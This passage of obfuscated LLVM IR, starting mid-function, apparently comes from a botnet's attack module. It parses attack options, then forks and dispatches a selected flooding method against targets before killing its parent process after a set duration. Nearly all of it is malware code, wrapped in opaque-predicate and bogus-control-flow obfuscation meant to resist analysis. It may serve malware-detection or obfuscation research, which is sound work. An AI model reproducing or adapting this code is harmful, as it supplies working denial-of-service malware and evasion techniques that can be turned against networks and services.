  %224 = call noalias i8* @calloc(i64 %223, i64 16) #7
  %225 = bitcast i8* %224 to %struct.attack_option*
  store %struct.attack_option* %225, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  %226 = load i32, i32* @x.7
  %227 = load i32, i32* @y.8
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %234

; <label>:234:                                    ; preds = %335, %originalBBpart220
  %235 = load i32, i32* %5, align 4
  %236 = load i8, i8* %9, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp slt i32 %235, %237
  br i1 %238, label %239, label %338

; <label>:239:                                    ; preds = %234
  %240 = load i32, i32* %4, align 4
  %241 = sext i32 %240 to i64
  %242 = icmp ult i64 %241, 1
  br i1 %242, label %243, label %244

; <label>:243:                                    ; preds = %239
  br label %347

; <label>:244:                                    ; preds = %239
  %245 = load i32, i32* @x.7
  %246 = load i32, i32* @y.8
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %244
  %253 = load i8*, i8** %3, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %3, align 8
  %255 = load i8, i8* %253, align 1
  %256 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %257 = load i32, i32* %5, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %259, i32 0, i32 1
  store i8 %255, i8* %260, align 8
  %261 = load i32, i32* %4, align 4
  %262 = sext i32 %261 to i64
  %263 = sub i64 %262, 1
  %264 = trunc i64 %263 to i32
  store i32 %264, i32* %4, align 4
  %265 = load i32, i32* %4, align 4
  %266 = sext i32 %265 to i64
  %267 = icmp ult i64 %266, 1
  %268 = load i32, i32* @x.7
  %269 = load i32, i32* @y.8
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart233, label %originalBB22alteredBB

originalBBpart233:                                ; preds = %originalBB22
  br i1 %267, label %276, label %293

; <label>:276:                                    ; preds = %originalBBpart233
  %277 = load i32, i32* @x.7
  %278 = load i32, i32* @y.8
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %276
  %285 = load i32, i32* @x.7
  %286 = load i32, i32* @y.8
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %347

; <label>:293:                                    ; preds = %originalBBpart233
  %294 = load i8*, i8** %3, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %3, align 8
  %296 = load i8, i8* %294, align 1
  store i8 %296, i8* %12, align 1
  %297 = load i32, i32* %4, align 4
  %298 = sext i32 %297 to i64
  %299 = sub i64 %298, 1
  %300 = trunc i64 %299 to i32
  store i32 %300, i32* %4, align 4
  %301 = load i32, i32* %4, align 4
  %302 = load i8, i8* %12, align 1
  %303 = zext i8 %302 to i32
  %304 = icmp slt i32 %301, %303
  br i1 %304, label %305, label %306

; <label>:305:                                    ; preds = %293
  br label %347

; <label>:306:                                    ; preds = %293
  %307 = load i8, i8* %12, align 1
  %308 = zext i8 %307 to i32
  %309 = add nsw i32 %308, 1
  %310 = sext i32 %309 to i64
  %311 = call noalias i8* @calloc(i64 %310, i64 1) #7
  %312 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %313 = load i32, i32* %5, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %312, i64 %314
  %316 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %315, i32 0, i32 0
  store i8* %311, i8** %316, align 8
  %317 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %318 = load i32, i32* %5, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %320, i32 0, i32 0
  %322 = load i8*, i8** %321, align 8
  %323 = load i8*, i8** %3, align 8
  %324 = load i8, i8* %12, align 1
  %325 = zext i8 %324 to i32
  call void @util_memcpy(i8* %322, i8* %323, i32 %325)
  %326 = load i8, i8* %12, align 1
  %327 = zext i8 %326 to i32
  %328 = load i8*, i8** %3, align 8
  %329 = sext i32 %327 to i64
  %330 = getelementptr inbounds i8, i8* %328, i64 %329
  store i8* %330, i8** %3, align 8
  %331 = load i8, i8* %12, align 1
  %332 = zext i8 %331 to i32
  %333 = load i32, i32* %4, align 4
  %334 = sub nsw i32 %333, %332
  store i32 %334, i32* %4, align 4
  br label %335

; <label>:335:                                    ; preds = %306
  %336 = load i32, i32* %5, align 4
  %337 = add nsw i32 %336, 1
  store i32 %337, i32* %5, align 4
  br label %234

; <label>:338:                                    ; preds = %234
  br label %339

; <label>:339:                                    ; preds = %338, %202
  %340 = call i32* @__errno_location() #8
  store i32 0, i32* %340, align 4
  %341 = load i32, i32* %6, align 4
  %342 = load i8, i8* %7, align 1
  %343 = load i8, i8* %8, align 1
  %344 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %345 = load i8, i8* %9, align 1
  %346 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %341, i8 zeroext %342, i8 zeroext %343, %struct.attack_target* %344, i8 zeroext %345, %struct.attack_option* %346)
  br label %347

; <label>:347:                                    ; preds = %339, %305, %originalBBpart237, %243, %201, %originalBBpart212, %101, %originalBBpart28, %originalBBpart24, %originalBBpart2
  %348 = load i32, i32* @x.7
  %349 = load i32, i32* @y.8
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %347
  %356 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %357 = icmp ne %struct.attack_target* %356, null
  %358 = load i32, i32* @x.7
  %359 = load i32, i32* @y.8
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %357, label %366, label %369

; <label>:366:                                    ; preds = %originalBBpart241
  %367 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %368 = bitcast %struct.attack_target* %367 to i8*
  call void @free(i8* %368) #7
  br label %369

; <label>:369:                                    ; preds = %366, %originalBBpart241
  %370 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %371 = icmp ne %struct.attack_option* %370, null
  br i1 %371, label %372, label %392

; <label>:372:                                    ; preds = %369
  %373 = load i32, i32* @x.7
  %374 = load i32, i32* @y.8
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %372
  %381 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %382 = load i8, i8* %9, align 1
  %383 = zext i8 %382 to i32
  call void @free_opts(%struct.attack_option* %381, i32 %383)
  %384 = load i32, i32* @x.7
  %385 = load i32, i32* @y.8
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %392

; <label>:392:                                    ; preds = %originalBBpart245, %369
  %393 = load i32, i32* @x.7
  %394 = load i32, i32* @y.8
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %392
  %401 = load i32, i32* @x.7
  %402 = load i32, i32* @y.8
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %16
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %109
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %181
  %409 = load i32, i32* %4, align 4
  %410 = sext i32 %409 to i64
  %411 = icmp ult i64 %410, 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %213
  %412 = load i8, i8* %9, align 1
  %413 = zext i8 %412 to i64
  %414 = call noalias i8* @calloc(i64 %413, i64 16) #7
  %415 = bitcast i8* %414 to %struct.attack_option*
  store %struct.attack_option* %415, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %244
  %416 = load i8*, i8** %3, align 8
  %417 = getelementptr inbounds i8, i8* %416, i32 1
  store i8* %417, i8** %3, align 8
  %418 = load i8, i8* %416, align 1
  %419 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %420 = load i32, i32* %5, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %422, i32 0, i32 1
  store i8 %418, i8* %423, align 8
  %424 = load i32, i32* %4, align 4
  %425 = sext i32 %424 to i64
  %_ = sub i64 0, %425
  %gen = add i64 %_, 1
  %_23 = shl i64 %425, 1
  %_24 = shl i64 %425, 1
  %_25 = sub i64 %425, 1
  %gen26 = mul i64 %_25, 1
  %_27 = sub i64 %425, 1
  %gen28 = mul i64 %_27, 1
  %_29 = shl i64 %425, 1
  %_30 = sub i64 %425, 1
  %gen31 = mul i64 %_30, 1
  %426 = sub i64 %425, 1
  %427 = trunc i64 %426 to i32
  store i32 %427, i32* %4, align 4
  %428 = load i32, i32* %4, align 4
  %429 = sext i32 %428 to i64
  %430 = icmp ult i64 %429, 1
  br label %originalBB22

originalBB35alteredBB:                            ; preds = %originalBB35, %276
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %347
  %431 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %432 = icmp ne %struct.attack_target* %431, null
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %372
  %433 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %434 = load i8, i8* %9, align 1
  %435 = zext i8 %434 to i32
  call void @free_opts(%struct.attack_option* %433, i32 %435)
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %392
  br label %originalBB47
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #7
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %38, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* @x.9
  %21 = load i32, i32* @y.10
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %13, align 4
  %29 = icmp sgt i32 %28, 0
  %30 = load i32, i32* @x.9
  %31 = load i32, i32* @y.10
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %39

; <label>:38:                                     ; preds = %originalBBpart2, %6
  ret void

; <label>:39:                                     ; preds = %originalBBpart2
  %40 = call i32 @fork() #7
  store i32 %40, i32* %14, align 4
  %41 = load i32, i32* %14, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %60

; <label>:43:                                     ; preds = %39
  %44 = load i32, i32* @x.9
  %45 = load i32, i32* @y.10
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  call void @exit(i32 0) #9
  %52 = load i32, i32* @x.9
  %53 = load i32, i32* @y.10
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:60:                                     ; preds = %39
  %61 = load i32, i32* @x.9
  %62 = load i32, i32* @y.10
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %60
  %69 = load i32, i32* %14, align 4
  %70 = icmp eq i32 %69, 0
  %71 = load i32, i32* @x.9
  %72 = load i32, i32* @y.10
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %70, label %79, label %100

; <label>:79:                                     ; preds = %originalBBpart28
  %80 = load i32, i32* @x.9
  %81 = load i32, i32* @y.10
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %79
  %88 = load i32, i32* %7, align 4
  %89 = call i32 @sleep(i32 %88)
  %90 = call i32 @getppid() #7
  %91 = call i32 @kill(i32 %90, i32 9) #7
  call void @exit(i32 0) #9
  %92 = load i32, i32* @x.9
  %93 = load i32, i32* @y.10
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

; <label>:100:                                    ; preds = %originalBBpart28
  store i32 0, i32* %15, align 4
  br label %101

; <label>:101:                                    ; preds = %originalBBpart228, %100
  %102 = load i32, i32* %15, align 4
  %103 = load i8, i8* @methods_len, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp slt i32 %102, %104
  br i1 %105, label %106, label %198

; <label>:106:                                    ; preds = %101
  %107 = load i32, i32* @x.9
  %108 = load i32, i32* @y.10
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %106
  %115 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %116 = load i32, i32* %15, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %115, i64 %117
  %119 = load %struct.attack_method*, %struct.attack_method** %118, align 8
  %120 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %119, i32 0, i32 1
  %121 = load i8, i8* %120, align 8
  %122 = zext i8 %121 to i32
  %123 = load i8, i8* %8, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %122, %124
  %126 = load i32, i32* @x.9
  %127 = load i32, i32* @y.10
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %125, label %134, label %162

; <label>:134:                                    ; preds = %originalBBpart216
  %135 = load i32, i32* @x.9
  %136 = load i32, i32* @y.10
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %134
  %143 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %144 = load i32, i32* %15, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %143, i64 %145
  %147 = load %struct.attack_method*, %struct.attack_method** %146, align 8
  %148 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %147, i32 0, i32 0
  %149 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %148, align 8
  %150 = load i8, i8* %9, align 1
  %151 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %152 = load i8, i8* %11, align 1
  %153 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %149(i8 zeroext %150, %struct.attack_target* %151, i8 zeroext %152, %struct.attack_option* %153)
  %154 = load i32, i32* @x.9
  %155 = load i32, i32* @y.10
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %198

; <label>:162:                                    ; preds = %originalBBpart216
  %163 = load i32, i32* @x.9
  %164 = load i32, i32* @y.10
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %162
  %171 = load i32, i32* @x.9
  %172 = load i32, i32* @y.10
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %179

; <label>:179:                                    ; preds = %originalBBpart224
  %180 = load i32, i32* @x.9
  %181 = load i32, i32* @y.10
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %179
  %188 = load i32, i32* %15, align 4
  %189 = add nsw i32 %188, 1
  store i32 %189, i32* %15, align 4
  %190 = load i32, i32* @x.9
  %191 = load i32, i32* @y.10
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %101

; <label>:198:                                    ; preds = %originalBBpart220, %101
  call void @exit(i32 0) #9
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %19
  %199 = load i32, i32* %13, align 4
  %200 = icmp sgt i32 %199, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  call void @exit(i32 0) #9
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %60
  %201 = load i32, i32* %14, align 4
  %202 = icmp eq i32 %201, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %79
  %203 = load i32, i32* %7, align 4
  %204 = call i32 @sleep(i32 %203)
  %205 = call i32 @getppid() #7
  %206 = call i32 @kill(i32 %205, i32 9) #7
  call void @exit(i32 0) #9
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %106
  %207 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %208 = load i32, i32* %15, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %207, i64 %209
  %211 = load %struct.attack_method*, %struct.attack_method** %210, align 8
  %212 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %211, i32 0, i32 1
  %213 = load i8, i8* %212, align 8
  %214 = zext i8 %213 to i32
  %215 = load i8, i8* %8, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %214, %216
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %134
  %218 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %219 = load i32, i32* %15, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %218, i64 %220
  %222 = load %struct.attack_method*, %struct.attack_method** %221, align 8
  %223 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %222, i32 0, i32 0
  %224 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %223, align 8
  %225 = load i8, i8* %9, align 1
  %226 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %227 = load i8, i8* %11, align 1
  %228 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %224(i8 zeroext %225, %struct.attack_target* %226, i8 zeroext %227, %struct.attack_option* %228)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %162
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %179
  %229 = load i32, i32* %15, align 4
  %_ = sub i32 0, %229
  %gen = add i32 %_, 1
  %230 = add nsw i32 %229, 1
  store i32 %230, i32* %15, align 4
  br label %originalBB26
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = load i32, i32* @x.11
  %4 = load i32, i32* @y.12
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %11, align 8
  store i32 %1, i32* %12, align 4
  %14 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %15 = icmp eq %struct.attack_option* %14, null
  %16 = load i32, i32* @x.11
  %17 = load i32, i32* @y.12
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %41

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* @x.11
  %26 = load i32, i32* @y.12
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = load i32, i32* @x.11
  %34 = load i32, i32* @y.12
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %132

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.11
  %43 = load i32, i32* @y.12
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %41
  store i32 0, i32* %13, align 4
  %50 = load i32, i32* @x.11
  %51 = load i32, i32* @y.12
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %58

; <label>:58:                                     ; preds = %126, %originalBBpart28
  %59 = load i32, i32* @x.11
  %60 = load i32, i32* @y.12
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %58
  %67 = load i32, i32* %13, align 4
  %68 = load i32, i32* %12, align 4
  %69 = icmp slt i32 %67, %68
  %70 = load i32, i32* @x.11
  %71 = load i32, i32* @y.12
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %69, label %78, label %129

; <label>:78:                                     ; preds = %originalBBpart212
  %79 = load i32, i32* @x.11
  %80 = load i32, i32* @y.12
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %78
  %87 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %88 = load i32, i32* %13, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %90, i32 0, i32 0
  %92 = load i8*, i8** %91, align 8
  %93 = icmp ne i8* %92, null
  %94 = load i32, i32* @x.11
